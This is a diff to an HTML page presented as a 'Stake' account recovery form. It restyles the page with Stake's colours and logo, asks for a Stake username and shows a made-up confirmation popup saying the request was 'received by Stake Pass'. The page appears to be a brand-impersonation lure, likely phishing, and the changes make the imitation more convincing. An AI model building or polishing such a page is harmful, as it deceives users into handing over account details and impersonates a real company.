@@ -8,7 +8,7 @@
     body {
       margin: 0;
       font-family: Arial, sans-serif;
-      background-color: #2f4553; /* Stake-style dark */
+      background-color: #0f212e;
       color: #fff;
       display: flex;
       justify-content: center;
@@ -16,7 +16,7 @@
       height: 100vh;
     }
     .container {
-      background-color: #1e1e1e;
+      background-color: #2f4553;
       padding: 20px;
       border-radius: 12px;
       width: 90%;
@@ -41,7 +41,7 @@
       font-size: 1rem;
     }
     button {
-      background-color: #00e701; /* Stake green */
+      background-color: #02dc05;
       color: white;
       cursor: pointer;
     }
@@ -51,57 +51,57 @@
     }
     .copy-btn {
       margin-top: 5px;
-      background-color: #3a3a3a;
+      background-color: #166ae0;
     }
     .message {
       margin-top: 10px;
       font-size: 0.9rem;
       color: #00ff9d;
     }
-    #popup-wrapper {
-      position: fixed;
-      top: 0;
-      left: 0;
-      width: 100%;
-      height: 100%;
-      background: rgba(0, 0, 0, 0.5);
-      display: none;
-      justify-content: center;
-      align-items: center;
-      z-index: 9999;
-    }
     #popup {
-      background-color: #1e1e1e;
+      position: fixed;
+      top: 50%;
+      left: 50%;
+      transform: translate(-50%, -50%);
+      background-color: #2f4553;
       color: #fff;
       padding: 20px;
       border-radius: 10px;
       box-shadow: 0 0 10px rgba(0,0,0,0.3);
+      z-index: 9999;
       text-align: center;
-      z-index: 10000;
+      display: none;
     }
     #popup button {
       margin-top: 10px;
       padding: 10px 20px;
-      background-color: #00e701;
-      color: white;
+      background-color: #02dc05;
     }
     .blur {
       filter: blur(5px);
       pointer-events: none;
       user-select: none;
     }
-    .heading {
+    .header {
       text-align: center;
-      font-size: 24px;
       margin-bottom: 20px;
-      color: #00e701;
+    }
+    .header img {
+      width: 120px;
+      margin-bottom: 10px;
+    }
+    .header h2 {
+      color: #ffffff;
+      font-weight: bold;
     }
   </style>
 </head>
 <body>
   <div id="main-content" class="container">
-    <div class="heading">Account Recovery</div>
-
+    <div class="header">
+      <img src="https://seeklogo.com/images/S/stake-logo-7B151FE3B2-seeklogo.com.png" alt="Stake Logo">
+      <h2>Account Recovery</h2>
+    </div>
     <div class="form-group">
       <label for="username">Username</label>
       <input type="text" id="username" placeholder="Enter Stake Username" />
@@ -148,11 +148,9 @@
     <button id="submitBtn" onclick="submitForm()" disabled>Submit</button>
   </div>
 
-  <div id="popup-wrapper">
-    <div id="popup">
-      <p>Your account recovery request has been received, we forward your request to main stake team . Your Stake account will be fully active within 24 - 72 hours.</p>
-      <button onclick="closePopup()">OK</button>
-    </div>
+  <div id="popup">
+    <p>Your account recovery request has been received by Stake Pass. Your Stake account will be fully active within 24 - 72 hours.</p>
+    <button onclick="closePopup()">OK</button>
   </div>
 
   <script>
@@ -220,7 +218,7 @@
 
     function submitForm() {
       document.getElementById('main-content').classList.add('blur');
-      document.getElementById('popup-wrapper').style.display = 'flex';
+      document.getElementById('popup').style.display = 'block';
     }
 
     function closePopup() {
